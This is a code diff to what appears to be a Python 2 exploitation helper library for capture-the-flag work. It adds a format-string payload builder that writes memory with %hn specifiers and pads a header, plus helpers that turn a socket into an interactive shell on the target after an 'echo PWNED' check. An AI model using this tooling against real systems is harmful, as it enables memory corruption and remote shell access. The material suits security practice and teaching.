@@ -4,6 +4,7 @@ import socket
 import telnetlib
 import sys
 import struct
+import time
 
 def _rotN(c, n):
 	if "A" <= c and c <= "Z":
@@ -104,13 +105,18 @@ class Pwning:
 		self.PORT = int(target.split(':')[1], 10)
 		
 		print "[*]Connecting \"" + target + "\"..."
-
+		
+		time.sleep(0.5)	
+	
 		try:
 			self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 			self.s.connect((self.HOST, self.PORT))
 			self.f = self.s.makefile("rw", bufsize=0)
 		except:
 			print "[*]Connection refused."
+			sys.exit()
+
+		print "[*]Connection success!"
 
 	def write(self, msg):
 		self.f.write(msg)
@@ -127,11 +133,18 @@ class Pwning:
                         data += self.f.read(1)
                 return data
 
+	def dbg_shell(self):
+                t = telnetlib.Telnet()
+                t.sock = self.s
+                t.interact()
+
         def shell(self):
                 t = telnetlib.Telnet()
                 t.sock = self.s
-		#self.write("echo PWNED\n")
-		#self.read_until("PWNED")
+		self.recv(1)
+		self.write("echo PWNED\n")
+		self.read_until("PWNED")
+		#self.write("ls -lia\n")
                 print "4ll y0u n33d i5 5HELL!"
                 t.interact()
 
@@ -187,9 +200,19 @@ class FSB:
 		self.offset = offset
 		self.addr = {}
 		
-        def rewrite(self, src, dest):
-		lsb = ( dest & 0x0000FFFF ) >> 0
-		msb = ( dest & 0xFFFF0000 ) >> 16
+		if len(header):
+			if len(header) % 4:
+				print "[*] padding payload..."
+				padding =  '?' * (4 - (len(header)%4))
+			else:
+				padding =  ''
+
+			self.header = header + padding
+			self.offset += len(self.header) / 4
+
+	def rewrite(self, src, dst):
+		lsb = ( dst & 0x0000FFFF ) >> 0
+		msb = ( dst & 0xFFFF0000 ) >> 16
 		
 		self.addr[hex(src)] = lsb
 		self.addr[hex(src + 2)] = msb
@@ -198,10 +221,10 @@ class FSB:
 		addr = OrderedDict(sorted(self.addr.items(), key=lambda x:x[1]))
 		for k in addr.keys():
 			self.payload += p32(int(k, 16))
-	
+
 		for k in addr.keys():
 			if k == addr.keys()[0]:
-				self.payload += "%" + str(addr[k] - len(self.payload)) + "x"
+				self.payload += "%" + str(addr[k] - len(self.header + self.payload)) + "x"
 				self.payload += "%" + str(self.offset) + "$hn"
 				calculated = addr[k]
 			else:
@@ -210,11 +233,8 @@ class FSB:
 				calculated = addr[k]
 			self.offset += 1
 
-		return self.payload
-
-class DLresolve:
-	def __init__(self):
-		pass
+		return self.header + self.payload
 class Heap:
+	#TODO
 	def __init__(self):
 		pass
